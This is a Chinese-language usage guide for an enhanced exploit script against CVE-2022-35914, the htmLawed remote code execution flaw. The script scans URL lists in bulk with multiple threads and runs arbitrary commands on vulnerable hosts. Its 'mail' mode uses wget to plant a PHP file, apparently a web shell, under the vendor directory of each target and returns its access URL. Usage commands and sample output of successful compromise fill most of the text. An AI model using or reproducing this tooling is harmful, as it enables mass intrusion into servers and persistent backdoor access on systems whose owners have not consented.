# CVE-2022-35914 增强版使用说明

## 功能概述

这个增强版脚本在原有CVE-2022-35914检测功能基础上，新增了以下功能：

1. **批量漏洞检测** (`-l`): 检测文件中的所有URL是否存在漏洞
2. **Mail操作** (`-m`): 对单个URL执行mail检测和下载操作
3. **批量Mail操作** (`-lm`): 对文件中的所有URL执行mail操作
4. **结果输出** (`-o`): 将检测结果保存到文件

## 使用方法

### 1. 批量漏洞检测
```bash
# 使用默认10个线程
python CVE-2022-35914-enhanced.py -l urls.txt -o results.txt

# 使用20个线程
python CVE-2022-35914-enhanced.py -l urls.txt -o results.txt -t 20
```
- 检测 `urls.txt` 文件中的所有URL
- 将存在漏洞的URL保存到 `results.txt`
- 支持多线程并发检测，提高效率

### 2. Mail操作（单个URL）
```bash
python CVE-2022-35914-enhanced.py -m http://target.com -o mail_result.txt
```
- 对指定URL执行 `ls ../../../../` 命令
- 如果发现mail目录，下载 `mail_system.php`
- 返回访问地址并保存结果

### 3. 批量Mail操作
```bash
# 使用默认10个线程
python CVE-2022-35914-enhanced.py -lm urls.txt -o batch_mail_results.txt

# 使用5个线程（较保守）
python CVE-2022-35914-enhanced.py -lm urls.txt -o batch_mail_results.txt -t 5
```
- 对文件中的所有URL执行mail操作
- 保存所有成功处理的URL和访问地址
- 支持多线程并发处理，提高效率

### 4. 原有功能（保持兼容）
```bash
# 单个URL检测
python CVE-2022-35914-enhanced.py -u http://target.com

# 执行自定义命令
python CVE-2022-35914-enhanced.py -u http://target.com -c "whoami"

# 仅检查漏洞
python CVE-2022-35914-enhanced.py -u http://target.com --check
```

## 参数说明

### 新增参数
- `-l URL_FILE`: 批量检测URL文件路径
- `-m TARGET_URL`: 对指定URL执行mail检测和下载操作
- `-lm BATCH_FILE`: 批量执行mail检测和下载操作
- `-o OUTPUT_FILE`: 输出结果到指定文件
- `-t THREADS`: 多线程数量 (默认: 10)

### 原有参数（保持兼容）
- `-u URL`: 单个URL测试
- `-c CMD`: 要执行的命令（默认: id）
- `-f HOOK`: PHP hook函数（默认: exec）
- `--check`: 仅检查漏洞，不执行命令
- `--user-agent`: 自定义User-Agent

## 输出示例

### 批量检测输出
```
[*] 开始批量检测漏洞...
[*] 共发现 5 个URL需要检测
[1/5] 检测: http://example1.com
[+] 发现漏洞: http://example1.com
[2/5] 检测: http://example2.com
[-] 无漏洞: http://example2.com
...

[*] 检测完成! 发现 2 个存在漏洞的URL
[+] 存在漏洞的URL列表:
  - http://example1.com
  - https://target1.example.com
```

### Mail操作输出
```
[*] 开始对 http://target.com 执行mail操作...
[+] 目标存在漏洞，开始执行命令...
[+] 发现mail目录，开始下载mail_system.php...
[*] 删除现有mail_system.php文件...
[+] 下载命令已执行
[+] 访问地址: http://target.com/vendor/htmlawed/htmlawed/mail_system.php
```

## 文件格式

### URL文件格式 (urls.txt)
```
http://example1.com
http://example2.com
https://target1.example.com
https://target2.example.com
```

### 输出文件格式
- 漏洞检测结果：每行一个存在漏洞的URL
- Mail操作结果：包含目标URL、访问地址和操作详情

## 注意事项

1. 确保目标服务器存在CVE-2022-35914漏洞
2. 批量操作时建议控制并发数量，避免对目标服务器造成过大压力
3. 输出文件会覆盖已存在的同名文件
4. 所有网络请求都禁用了SSL验证，请谨慎使用
5. 建议在授权的测试环境中使用此工具
6. **Mail操作说明**: 由于wget命令下载文件后通常没有明显回显，脚本会默认认为下载成功。只要检测到mail目录并执行了下载命令，就会生成访问地址
7. **多线程说明**: 默认使用10个线程，可根据目标服务器性能和网络状况调整。线程数过多可能导致目标服务器压力过大或被封IP
8. **文件清理**: 在下载mail_system.php之前，脚本会自动删除现有的同名文件，确保下载的文件名正确

## 依赖安装

```bash
pip install -r requirements.txt
```

依赖包：
- beautifulsoup4
- requests
- argparse
